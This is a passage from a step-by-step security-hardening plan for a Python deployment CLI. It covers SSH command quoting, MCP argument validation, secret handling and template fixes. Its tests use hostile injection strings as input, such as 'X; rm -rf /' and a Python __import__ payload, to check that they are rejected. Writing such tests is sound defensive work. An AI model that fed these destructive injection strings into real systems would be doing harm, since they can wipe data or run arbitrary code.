        code, output = _run_ssh_command(ssh_host, clone_cmd)
```

with:

```python
        clone_cmd = _build_clone_cmd(deploy_path, git_repo)
        code, output = _run_ssh_command(ssh_host, clone_cmd)
```

3e. In `deploy_init`, in the Traefik block (~line 645), the script interpolates `deploy_path` and `main_domain`. Add quoting before the f-string and use the quoted variable for every path occurrence:

Replace:

```python
            domains = config.get("domains", {})
            main_domain = domains.get("main", "example.com")
```

with:

```python
            domains = config.get("domains", {})
            try:
                main_domain = validate_domain(domains.get("main", "example.com"))
            except ValidationError as e:
                console.print(f"[red]Invalid domain in config: {e}[/red]")
                raise typer.Exit(1)
            qpath = quote(deploy_path)
```

Then inside the existing `traefik_setup_cmd = f"""..."""` string, replace every `{deploy_path}` with `{qpath}` (4 occurrences: `mkdir -p {qpath}/traefik`, `cat > {qpath}/traefik/traefik.yml`, `mkdir -p {qpath}/letsencrypt`, `touch {qpath}/letsencrypt/acme.json`, `chmod 600 {qpath}/letsencrypt/acme.json`). `{main_domain}` stays (validated to a safe charset; it sits inside a quoted heredoc).

3f. In `deploy_init`, replace the `start_cmd` block (~line 695):

```python
        start_cmd = f"""
            cd {deploy_path} && \
            docker compose pull && \
            docker compose up -d
        """
```

with (also fixes production auto-loading the dev override added in Task 12):

```python
        qpath = quote(deploy_path)
        start_cmd = (
            f"cd {qpath} && "
            f"if [ -f docker-compose.prod.yml ]; then "
            f"docker compose -f docker-compose.yml -f docker-compose.prod.yml pull && "
            f"docker compose -f docker-compose.yml -f docker-compose.prod.yml up -d; "
            f"else docker compose -f docker-compose.yml pull && "
            f"docker compose -f docker-compose.yml up -d; fi"
        )
```

3g. In `deploy_status`, replace the two f-string commands that interpolate `deploy_path`:

```python
            f"cd {deploy_path} && git log -1 --format='%h %s (%cr)' 2>/dev/null"
```
→
```python
            f"cd {quote(deploy_path)} && git log -1 --format='%h %s (%cr)' 2>/dev/null"
```

and

```python
            f"cd {deploy_path} && docker compose ps --format 'table {{{{.Name}}}}|{{{{.Status}}}}|{{{{.Service}}}}' 2>/dev/null || docker-compose ps --format 'table {{{{.Name}}}}|{{{{.Status}}}}' 2>/dev/null"
```
→ same, with `{quote(deploy_path)}`.

3h. In `_run_deploy`, quote path/version in the three command strings:

```python
        pull_cmd = f"cd {deploy_path} && git pull"
        if version and version != "latest":
            pull_cmd = f"cd {deploy_path} && git fetch && git checkout {version}"
```
→
```python
        qpath = quote(deploy_path)
        pull_cmd = f"cd {qpath} && git pull"
        if version and version != "latest":
            pull_cmd = f"cd {qpath} && git fetch && git checkout {quote(version)}"
```

```python
        compose_file_check = f"test -f {deploy_path}/docker-compose.prod.yml && echo 'prod' || echo 'dev'"
```
→
```python
        compose_file_check = f"test -f {qpath}/docker-compose.prod.yml && echo 'prod' || echo 'dev'"
```

In the same function, the `else` branch selecting the compose command changes from:

```python
            compose_cmd = "docker compose"
```
to:
```python
            compose_cmd = "docker compose -f docker-compose.yml"
```

(so production servers never auto-load `docker-compose.override.yml`), and the per-component deploy command:

```python
            deploy_cmd = f"""
                cd {deploy_path} && \
                {compose_cmd} pull {comp} 2>&1; \
                {compose_cmd} up -d --build {comp} 2>&1
            """
```
→
```python
            deploy_cmd = (
                f"cd {qpath} && "
                f"{compose_cmd} pull {comp} 2>&1; "
                f"{compose_cmd} up -d --build {comp} 2>&1"
            )
```

(`comp` comes from the `VALID_COMPONENTS` allowlist.) Finally the verify command later in `_run_deploy`:

```python
        f"cd {deploy_path} && docker compose ps --format '{{{{.Name}}}}|{{{{.Status}}}}'"
```
→ `f"cd {qpath} && docker compose ps --format '{{{{.Name}}}}|{{{{.Status}}}}'"`

3i. In `deploy_logs`, replace:

```python
    log_cmd = f"cd {deploy_path} && docker compose logs {follow_flag} --tail={lines} {component}"
```
with:
```python
    log_cmd = f"cd {quote(deploy_path)} && docker compose logs {follow_flag} --tail={lines} {component}"
```

- [ ] **Step 4: Run the full deploy tests plus suite**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_deploy_security.py tests/test_shell.py tests/test_validate.py -q`
Expected: all pass

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest -q 2>&1 | tail -3`
Expected: only the 5 pre-existing failures (see plan header); everything else passes.

- [ ] **Step 5: Commit**

```bash
cd /Users/babak/codes/DoTech/lich-framework
git add cli/src/lich/commands/deploy.py cli/tests/test_deploy_security.py
git commit -m "fix(security): shell-quote all values interpolated into remote SSH scripts"
```

---

### Task 7: MCP tool argument validation

**Files:**
- Modify: `cli/src/lich/mcp/tools/make.py` (validation on every tool)
- Modify: `cli/src/lich/mcp/tools/migration.py` (`lich_migration_create` message)
- Modify: `cli/src/lich/mcp/tools/secret.py` (bounds on `lich_secret_generate`)
- Create: `cli/tests/test_mcp_validation.py`

- [ ] **Step 1: Write the failing tests**

Create `cli/tests/test_mcp_validation.py`:

```python
"""MCP tools must validate their arguments before touching the CLI/generators."""
import pytest

from lich.mcp.server import mcp


def _text_of(result) -> str:
    """Flatten a FastMCP call_tool result to a plain string."""
    return str(result)


@pytest.mark.asyncio
async def test_lich_make_entity_rejects_injection():
    result = await mcp.call_tool("lich_make_entity", {"name": "X; rm -rf /"})
    assert "Invalid name" in _text_of(result)


@pytest.mark.asyncio
async def test_lich_make_service_rejects_injection():
    result = await mcp.call_tool("lich_make_service", {"name": "{__import__('os')}"})
    assert "Invalid name" in _text_of(result)


@pytest.mark.asyncio
async def test_lich_migration_create_rejects_injection():
    result = await mcp.call_tool("lich_migration_create", {"message": "x; rm -rf /"})
    assert "Invalid name" in _text_of(result)


@pytest.mark.asyncio
async def test_lich_secret_generate_rejects_huge_length():
    result = await mcp.call_tool("lich_secret_generate", {"length": 1000000})
    assert "length must be between" in _text_of(result)


@pytest.mark.asyncio
async def test_lich_secret_generate_rejects_huge_count():
    result = await mcp.call_tool("lich_secret_generate", {"count": 5000})
    assert "count must be between" in _text_of(result)
```

Note: FastMCP may wrap tool errors as exceptions instead of text results depending on version. If a test fails with a raised exception containing the expected message, rewrite that test as `with pytest.raises(Exception, match="Invalid name"):` — the security property under test is identical.

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_mcp_validation.py -q`
Expected: FAIL — currently the tools pass args straight through (make tools would print "Not a Lich project", secret accepts any length).

- [ ] **Step 3: Implement validation in the three tool modules**

3a. `cli/src/lich/mcp/tools/make.py` — add after the existing imports:

```python
from lich.commands._validate import ValidationError, validate_identifier
```

Then in **every** tool in this file, validate before calling the generator. Pattern (shown for `lich_make_service`; apply identically to all 10 tools):

```python
    @mcp.tool()
    def lich_make_service(name: str):
        """Create a new Backend Service (Use Case)."""
        try:
            name = validate_identifier(name)
        except ValidationError as e:
            return f"ERROR: {e}"
        make_service(name)
        return f"Service '{name}' created."
```

For `lich_make_listener`, validate both args:

```python
    @mcp.tool()
    def lich_make_listener(name: str, event: str = "SomeEvent"):
        """Create an Event Listener."""
        try:
            name = validate_identifier(name)
            event = validate_identifier(event)
        except ValidationError as e:
            return f"ERROR: {e}"
        make_listener(name, event=event)
        return f"Listener '{name}' created for event '{event}'."
```

3b. `cli/src/lich/mcp/tools/migration.py` — add at top:

```python
from lich.commands._validate import ValidationError, validate_identifier
```

and in `lich_migration_create`, before building `cmd`:

```python
        try:
            message = validate_identifier(message)
        except ValidationError as e:
            return f"ERROR: {e}"
```

(Migration messages follow the `add_users_table` convention, which is exactly the identifier charset.)

3c. `cli/src/lich/mcp/tools/secret.py` — in `lich_secret_generate`, before building `cmd`:

```python
        if not 1 <= length <= 256:
            return "ERROR: length must be between 1 and 256"
        if not 1 <= count <= 20:
            return "ERROR: count must be between 1 and 20"
        if format not in ("hex", "alphanum", "urlsafe", "full"):
            return "ERROR: format must be one of hex, alphanum, urlsafe, full"
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_mcp_validation.py tests/test_mcp_server.py -q`
Expected: `test_mcp_validation.py` all pass. `test_mcp_server.py`: same 3 pre-existing failures as before this task (tool count/category tests) — no NEW failures.

- [ ] **Step 5: Commit**

```bash
cd /Users/babak/codes/DoTech/lich-framework
git add cli/src/lich/mcp/tools/make.py cli/src/lich/mcp/tools/migration.py cli/src/lich/mcp/tools/secret.py cli/tests/test_mcp_validation.py
git commit -m "fix(security): validate MCP tool arguments (names, migration message, secret bounds)"
```

---

### Task 8: Keep deploy secrets out of git

**Files:**
- Modify: `cli/src/lich/commands/deploy.py` (`_save_env_file`, end of `deploy_setup`)
- Modify: `cli/tests/test_deploy_security.py` (append)

`lich ci setup` already gitignores `.secrets` via `_add_to_gitignore` (`cli/src/lich/commands/ci.py:387`). `lich deploy setup` writes secret-bearing `.lich/deploy.<env>.env` files with no protection.

- [ ] **Step 1: Write the failing test**

Append to `cli/tests/test_deploy_security.py`:

```python
class TestDeploySecretsGitignore:
    def test_save_env_file_adds_gitignore_entries(self, temp_dir, monkeypatch):
        monkeypatch.chdir(temp_dir)
        from lich.commands.deploy import _save_env_file

        _save_env_file("production", {"API_KEY": "supersecret"})

        gitignore = (temp_dir / ".gitignore").read_text()
        assert ".lich/*.env" in gitignore
        assert ".secrets" in gitignore
        assert (temp_dir / ".lich" / "deploy.production.env").exists()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_deploy_security.py::TestDeploySecretsGitignore -q`
Expected: FAIL — no `.gitignore` file is created today.

- [ ] **Step 3: Implement**

In `cli/src/lich/commands/deploy.py`:

3a. Add import (next to the other new imports):

```python
from lich.commands.ci import _add_to_gitignore
```

3b. In `_save_env_file`, add the gitignore call just before the final `return env_file`:

```python
    _add_to_gitignore([".secrets", ".lich/*.env"])
```

(Import-cycle check: `ci.py` must not import from `deploy.py` at module level — it does not today. If a cycle ever appears, move `_add_to_gitignore` into `_shell.py`'s sibling `common` module in Phase 3.)

- [ ] **Step 4: Run test to verify it passes**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_deploy_security.py -q`
Expected: all pass

- [ ] **Step 5: Commit**

```bash
cd /Users/babak/codes/DoTech/lich-framework
git add cli/src/lich/commands/deploy.py cli/tests/test_deploy_security.py
git commit -m "fix(security): gitignore deploy env files containing secrets"
```

---

### Task 9: Template — production startup guard for default secrets

**Files:**
- Modify: `template/{{cookiecutter.project_slug}}/backend/pkg/config/settings.py`
- Create: `template/{{cookiecutter.project_slug}}/backend/tests/test_settings_guard.py` (runs in generated projects)
- Create: `cli/tests/test_template_security.py` (static assertions, runs in this repo's CI)

- [ ] **Step 1: Write the failing static test**

Create `cli/tests/test_template_security.py`:

```python
"""Static security assertions on the cookiecutter template sources.

These read the RAW template files (Jinja not rendered) and assert
security-relevant content, so template regressions fail this repo's CI.
"""
from pathlib import Path

TEMPLATE_ROOT = Path(__file__).parent.parent.parent / "template"
PROJECT_TEMPLATE = TEMPLATE_ROOT / "{{cookiecutter.project_slug}}"


class TestSettingsGuard:
    def test_settings_has_production_secret_guard(self):
        settings = (PROJECT_TEMPLATE / "backend/pkg/config/settings.py").read_text()
        assert "model_validator" in settings
        assert "_reject_default_secrets_in_production" in settings

    def test_generated_projects_get_the_guard_test(self):
        assert (PROJECT_TEMPLATE / "backend/tests/test_settings_guard.py").exists()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_template_security.py::TestSettingsGuard -q`
Expected: FAIL (no validator in settings.py, no guard test file)

- [ ] **Step 3: Implement the guard**

3a. In `template/{{cookiecutter.project_slug}}/backend/pkg/config/settings.py`, change the pydantic import line from:

```python
from pydantic import Field
```
to:
```python
from pydantic import Field, model_validator
```

3b. In the same file, add this method inside the `Settings` class, right after the `secret_key` field (before `class Config:`). It intentionally uses `getattr`, so it works for every `auth_strategy` (the `jwt_secret_key` field only exists when `auth_strategy == 'jwt_builtin'`) — no Jinja conditionals needed:

```python
    @model_validator(mode="after")
    def _reject_default_secrets_in_production(self):
        """Refuse to boot in production with placeholder secrets."""
        if self.environment.lower() == "production":
            for field_name in ("secret_key", "jwt_secret_key"):
                value = getattr(self, field_name, "")
                if isinstance(value, str) and "change-me" in value:
                    raise ValueError(
                        f"{field_name} still has its default value. "
                        "Set a real secret in the environment before running in production "
                        "(generate one with: openssl rand -hex 32)."
                    )
        return self
```

3c. Create `template/{{cookiecutter.project_slug}}/backend/tests/test_settings_guard.py` (this file has no Jinja tags; it ships into every generated project and runs in the generated project's own test suite):

```python
"""The app must refuse to start in production with placeholder secrets."""
import pytest

from pkg.config.settings import Settings


def test_production_rejects_default_secret_key(monkeypatch):
    monkeypatch.setenv("ENVIRONMENT", "production")
    monkeypatch.delenv("SECRET_KEY", raising=False)
    with pytest.raises(Exception, match="default value"):
        Settings(_env_file=None)


def test_production_boots_with_real_secrets(monkeypatch):
    monkeypatch.setenv("ENVIRONMENT", "production")
    monkeypatch.setenv("SECRET_KEY", "a" * 64)
    monkeypatch.setenv("JWT_SECRET_KEY", "b" * 64)
    settings = Settings(_env_file=None)
    assert settings.environment == "production"


def test_development_allows_defaults(monkeypatch):
    monkeypatch.setenv("ENVIRONMENT", "development")
    settings = Settings(_env_file=None)
    assert settings.environment == "development"
```

(`monkeypatch.setenv("JWT_SECRET_KEY", ...)` is harmless when the field doesn't exist for non-JWT auth strategies — pydantic-settings ignores unknown env vars by default.)

- [ ] **Step 4: Run test to verify it passes**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_template_security.py -q`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
cd /Users/babak/codes/DoTech/lich-framework
git add "template/{{cookiecutter.project_slug}}/backend/pkg/config/settings.py" "template/{{cookiecutter.project_slug}}/backend/tests/test_settings_guard.py" cli/tests/test_template_security.py
git commit -m "fix(security): generated apps refuse to boot in production with default secrets"
```

---

### Task 10: Template — never ship a default admin password

**Files:**
- Modify: `template/cookiecutter.json:9`
- Modify: `template/hooks/post_gen_project.py`
- Modify: `template/{{cookiecutter.project_slug}}/backend/scripts/seed_db.py:20-25`
- Modify: `cli/tests/test_template_security.py` (append)

- [ ] **Step 1: Write the failing static tests**

Append to `cli/tests/test_template_security.py`:

```python
import json


class TestAdminPassword:
    def test_cookiecutter_has_no_default_admin_password(self):
        config = json.loads((TEMPLATE_ROOT / "cookiecutter.json").read_text())
        assert config["admin_password"] == "", "admin_password must have no usable default"

    def test_post_gen_hook_generates_password(self):
        hook = (TEMPLATE_ROOT / "hooks/post_gen_project.py").read_text()
        assert "token_urlsafe" in hook
        assert "harden_admin_password" in hook

    def test_seed_script_refuses_weak_password(self):
        seed = (PROJECT_TEMPLATE / "backend/scripts/seed_db.py").read_text()
        assert 'in ("", "admin")' in seed
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_template_security.py::TestAdminPassword -q`
Expected: 3 FAIL

- [ ] **Step 3: Implement**

3a. In `template/cookiecutter.json`, change line 9 from:

```json
  "admin_password": "admin",
```
to:
```json
  "admin_password": "",
```

3b. In `template/hooks/post_gen_project.py`, add near the top (after the existing `import shutil`):

```python
import re
import secrets
```

Add this function after `make_executable`:

```python
def harden_admin_password(project_dir):
    """If no admin password was provided (or the insecure 'admin' was used),
    generate a random one, patch it into the seed script, and return it so
    main() can print it exactly once."""
    rendered = "{{ cookiecutter.admin_password }}"
    if rendered not in ("", "admin"):
        return None

    password = secrets.token_urlsafe(12)
    seed_file = os.path.join(project_dir, "backend", "scripts", "seed_db.py")
    if os.path.exists(seed_file):
        with open(seed_file) as f:
            content = f.read()
        content = re.sub(
            r'admin_password = ".*"',
            f'admin_password = "{password}"',
            content,
            count=1,
        )
        with open(seed_file, "w") as f:
            f.write(content)
    return password
```

(The hook file itself is Jinja-rendered, so `rendered` holds the user's actual input at generation time.)

In `main()`, right after `project_dir = os.getcwd()`, add:

```python
    generated_password = harden_admin_password(project_dir)
```

And right after the `print("\n✅ Project setup complete!")` line, add:

```python
    if generated_password:
        print("\n" + "!" * 50)
        print("🔑 GENERATED ADMIN PASSWORD (shown only once):")
        print(f"   email:    {{ cookiecutter.admin_email }}")
        print(f"   password: {generated_password}")
        print("   Change it after first login.")
        print("!" * 50)
```

3c. In `template/{{cookiecutter.project_slug}}/backend/scripts/seed_db.py`, replace lines 20-25:

```python
    admin_email = "{{ cookiecutter.admin_email }}"
    admin_password = "{{ cookiecutter.admin_password }}"
    
    if not admin_email or not admin_password:
        logger.warning("Admin email or password not configured in cookiecutter.")
        return
```

with:

```python
    admin_email = "{{ cookiecutter.admin_email }}"
    admin_password = "{{ cookiecutter.admin_password }}"

    # Environment always wins; the literal above is patched by the post-gen hook.
    admin_password = os.environ.get("ADMIN_PASSWORD", admin_password)

    if not admin_email:
        logger.warning("Admin email not configured.")
        return

    if admin_password in ("", "admin"):
        import secrets as _secrets
        admin_password = _secrets.token_urlsafe(12)
        logger.warning(
            f"No secure admin password configured - generated one: {admin_password} "
            "(save it now, it will not be shown again)"
        )
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_template_security.py -q`
Expected: all pass

- [ ] **Step 5: Commit**

```bash
cd /Users/babak/codes/DoTech/lich-framework
git add template/cookiecutter.json template/hooks/post_gen_project.py "template/{{cookiecutter.project_slug}}/backend/scripts/seed_db.py" cli/tests/test_template_security.py
git commit -m "fix(security): generate random admin password instead of default 'admin'"
```

---

### Task 11: Template — OAuth `state` parameter (CSRF protection)

**Files:**
- Modify: `template/{{cookiecutter.project_slug}}/backend/api/http/auth.py` (Google OAuth section, lines ~160-215)
- Modify: `cli/tests/test_template_security.py` (append)

- [ ] **Step 1: Write the failing static test**

Append to `cli/tests/test_template_security.py`:

```python
class TestOAuthState:
    def test_google_flow_uses_state_parameter(self):
        auth = (PROJECT_TEMPLATE / "backend/api/http/auth.py").read_text()
        assert "_make_oauth_state" in auth
        assert "_verify_oauth_state" in auth
        assert '"state": state' in auth
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_template_security.py::TestOAuthState -q`
Expected: FAIL

- [ ] **Step 3: Implement**

In `template/{{cookiecutter.project_slug}}/backend/api/http/auth.py`:

3a. Add these two helpers right above the `@router.get("/google/url")` endpoint (under the `# GOOGLE OAUTH` comment banner). They are stateless (HMAC-signed timestamp), so they work with multiple workers:

```python
import hashlib
import hmac as _hmac
import time


def _make_oauth_state() -> str:
    """Create a signed, time-limited state token for the OAuth flow."""
    ts = str(int(time.time()))
    sig = _hmac.new(settings.secret_key.encode(), ts.encode(), hashlib.sha256).hexdigest()
    return f"{ts}.{sig}"


def _verify_oauth_state(state: str, max_age_seconds: int = 600) -> bool:
    """Verify the signature and age of an OAuth state token."""
    try:
        ts, sig = state.split(".", 1)
        expected = _hmac.new(settings.secret_key.encode(), ts.encode(), hashlib.sha256).hexdigest()
        return _hmac.compare_digest(sig, expected) and (time.time() - int(ts)) < max_age_seconds
    except (ValueError, TypeError, AttributeError):
        return False
```

3b. In `google_auth_url()`, add state to the params and the response. Replace:

```python
    params = {
        "client_id": settings.google_client_id,
        "redirect_uri": settings.google_redirect_uri,
        "response_type": "code",
        "scope": "openid email profile",
        "access_type": "offline",
        "prompt": "consent",
    }
    
    google_auth_url = f"https://accounts.google.com/o/oauth2/v2/auth?{urllib.parse.urlencode(params)}"
    
    return {"url": google_auth_url}
```

with:

```python
    state = _make_oauth_state()
    params = {
        "client_id": settings.google_client_id,
        "redirect_uri": settings.google_redirect_uri,
        "response_type": "code",
        "scope": "openid email profile",
        "access_type": "offline",
        "prompt": "consent",
        "state": state,
    }

    google_auth_url = f"https://accounts.google.com/o/oauth2/v2/auth?{urllib.parse.urlencode(params)}"

    # The frontend must store `state` and send it back to /google/callback.
    return {"url": google_auth_url, "state": state}
```

3c. In `google_callback`, require and verify the state. Replace the signature:

```python
@router.post("/google/callback")
async def google_callback(
    code: str,
    user_service: UserService = Depends(get_user_service),
):
```

with:

```python
@router.post("/google/callback")
async def google_callback(
    code: str,
    state: str,
    user_service: UserService = Depends(get_user_service),
):
```

and add as the FIRST statement in the function body (before the settings check):

```python
    if not _verify_oauth_state(state):
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Invalid or expired OAuth state (possible CSRF).",
        )
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_template_security.py -q`
Expected: all pass

- [ ] **Step 5: Commit**

```bash
cd /Users/babak/codes/DoTech/lich-framework
git add "template/{{cookiecutter.project_slug}}/backend/api/http/auth.py" cli/tests/test_template_security.py
git commit -m "fix(security): add HMAC-signed state parameter to Google OAuth flow"
```

---

### Task 12: Template — Traefik dashboard only in dev

**Files:**
- Modify: `template/{{cookiecutter.project_slug}}/docker-compose.yml:14-31`
- Create: `template/{{cookiecutter.project_slug}}/docker-compose.override.yml`
- Modify: `cli/tests/test_template_security.py` (append)

(The deploy-side protection — production never auto-loading the override — was implemented in Task 6, steps 3f/3h.)

- [ ] **Step 1: Write the failing static tests**

Append to `cli/tests/test_template_security.py`:

```python
class TestTraefikDashboard:
    def test_base_compose_has_no_insecure_api(self):
        compose = (PROJECT_TEMPLATE / "docker-compose.yml").read_text()
        assert "--api.insecure=true" not in compose
        assert '"8090:8080"' not in compose

    def test_dev_override_exists_with_dashboard(self):
        override = (PROJECT_TEMPLATE / "docker-compose.override.yml").read_text()
        assert "--api.insecure=true" in override
        assert "8090:8080" in override
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_template_security.py::TestTraefikDashboard -q`
Expected: 2 FAIL

- [ ] **Step 3: Implement**

3a. In `template/{{cookiecutter.project_slug}}/docker-compose.yml`, in the `traefik` service `command:` list (lines 14-20), delete these two lines:

```yaml
      - "--api.insecure=true"
      - "--api.dashboard=true"
```

and in the `ports:` list (lines 28-31), delete:

```yaml
      - "8090:8080"
```

Everything else in the service (including the `use_tls` Jinja block) stays unchanged.

3b. Create `template/{{cookiecutter.project_slug}}/docker-compose.override.yml`:

```yaml
# Development-only overrides.
# `docker compose up` merges this file automatically on your machine.
# Production deploys (lich deploy) run with explicit -f flags and never load it.
#
# NOTE: `command:` REPLACES the base list entirely, so all dev flags live here.
services:
  traefik:
    command:
      - "--api.insecure=true"
      - "--api.dashboard=true"
      - "--providers.docker=true"
      - "--providers.docker.exposedbydefault=false"
      - "--entrypoints.web.address=:80"
      - "--entrypoints.websecure.address=:443"
    ports:
      - "8090:8080"   # Traefik dashboard: http://localhost:8090
```

3c. In `template/hooks/post_gen_project.py`, the printed infrastructure URL stays correct (`Traefik: http://localhost:8090` still works in dev via the override) — no change needed.

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_template_security.py -q`
Expected: all pass

- [ ] **Step 5: Commit**

```bash
cd /Users/babak/codes/DoTech/lich-framework
git add "template/{{cookiecutter.project_slug}}/docker-compose.yml" "template/{{cookiecutter.project_slug}}/docker-compose.override.yml" cli/tests/test_template_security.py
git commit -m "fix(security): Traefik dashboard is dev-only (compose override, never in production)"
```

---

### Task 13: Phase completion — suite, changelog, version bump

**Files:**
- Modify: `CHANGELOG.md` (repo root, prepend entry)
- Modify: `cli/pyproject.toml:7` (version)
- Modify: `template/cookiecutter.json` (`_lich_version`)

- [ ] **Step 1: Run the full test suite**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest -q 2>&1 | tail -8`
Expected: exactly the 5 pre-existing failures listed in the plan header; every other test (including all new `test_validate.py`, `test_shell.py`, `test_deploy_security.py`, `test_mcp_validation.py`, `test_template_security.py`) passes. If ANY other test fails, stop and fix before proceeding.

- [ ] **Step 2: Prepend the changelog entry**

In `CHANGELOG.md`, insert directly after the `# Changelog` header block (before `## [1.12.15]`):

```markdown
## [1.13.0] - 2026-07-10

### Security
- **Shell injection fixed**: `lich deploy` no longer uses `shell=True`; deploy-key verification runs as an argument list (`deploy.py`).
- **Input validation everywhere**: new `_validate.py` module; generator names (`lich make`), deploy paths, git URLs, git refs, domains and `lich deploy logs -c` components are validated against strict allowlists at every entry point (CLI prompts, CLI options, config files, MCP tool arguments).
- **Quoted remote scripts**: every value interpolated into SSH scripts is `shlex.quote()`d (new `_shell.py` module with `run_local`/`run_remote`).
- **MCP hardening**: `lich_make_*` and `lich_migration_create` validate names; `lich_secret_generate` bounds length (≤256) and count (≤20).
- **Secrets hygiene**: `lich deploy setup` gitignores `.secrets` and `.lich/*.env`.
- **Template — production guard**: generated apps refuse to boot with `environment=production` while `secret_key`/`jwt_secret_key` still contain the `change-me` default.
- **Template — admin password**: no more default `admin` password; a random password is generated at project creation (printed once) and the seed script refuses weak values.
- **Template — OAuth CSRF**: Google OAuth flow now uses an HMAC-signed `state` parameter.
- **Template — Traefik**: insecure dashboard (`--api.insecure=true`, port 8090) moved to a dev-only `docker-compose.override.yml`; `lich deploy` uses explicit `-f` flags so production never loads it.
```

- [ ] **Step 3: Bump versions**

In `cli/pyproject.toml`, change:

```toml
version = "1.12.15"
```
to:
```toml
version = "1.13.0"
```

In `template/cookiecutter.json`, change:

```json
  "_lich_version": "1.12.12",
```
to:
```json
  "_lich_version": "1.13.0",
```

(`cli/src/lich/__init__.py` reads the version via `importlib.metadata` — no edit needed there.)

- [ ] **Step 4: Verify version**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && grep -n '^version' pyproject.toml`
Expected: `version = "1.13.0"`

- [ ] **Step 5: Commit**

```bash
cd /Users/babak/codes/DoTech/lich-framework
git add CHANGELOG.md cli/pyproject.toml template/cookiecutter.json
git commit -m "chore(release): v1.13.0 - security sprint (Phase 1 of v1 hardening)"
```

- [ ] **Step 6: Report**

Report to the human: Phase 1 complete, list the commits, confirm the suite state (all green except the 5 pre-existing failures that Phase 2 fixes). Do NOT publish to PyPI — release is a human decision.
